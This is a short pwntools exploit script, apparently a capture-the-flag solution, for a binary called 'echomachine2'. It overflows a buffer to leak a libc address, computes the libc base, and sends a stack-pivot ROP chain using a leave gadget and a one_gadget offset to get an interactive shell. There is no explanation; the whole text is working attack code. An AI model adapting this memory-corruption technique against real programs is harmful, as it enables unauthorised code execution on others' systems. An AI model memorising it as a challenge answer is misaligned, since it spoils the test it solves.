from pwn import *

p = process('./echomachine2')
elf = ELF('./echomachine2')
libc = elf.libc

main = elf.sym['main']
message = 0x601080
leave = 0x000000000040070a
pop_rsi_r15 = 0x0000000000400771

payload = b'a'*56 + b'\x6f'
p.sendafter('message:', payload)
p.recvuntil('a'*56)
__libc_start_main = u64(p.recv(6).ljust(8, b'\x00'))-175
base = __libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', base)
one_gadget = 0xe6ce9 + base

payload = p64(message) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(one_gadget) + b'a'*8 + p64(message) + p64(leave)
p.sendafter('message:', payload)

p.interactive()